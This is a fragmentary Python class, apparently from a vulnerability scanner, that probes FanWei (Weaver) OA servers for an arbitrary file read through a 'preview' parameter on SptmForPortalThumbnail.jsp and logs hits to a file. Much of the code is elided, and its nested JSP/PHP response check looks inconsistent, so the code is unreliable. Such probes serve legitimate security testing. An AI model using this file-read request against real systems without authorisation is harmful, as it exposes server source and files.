...
class SptmForPortalThumbnail_file_read_Scan:
	def scan(self,baseurl):
		url = baseurl + '/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
		try:
			...
			if '<%@' in response.text and response.status_code == 200:
				if response.status_code == 200 and '<?php' in response.text:
					...
					if self.batch:
						OutPutFile("fanwei_sptm_file_read.txt",f'存在FanWei任意文件读取{url}')
				else:
					if not self.batch:
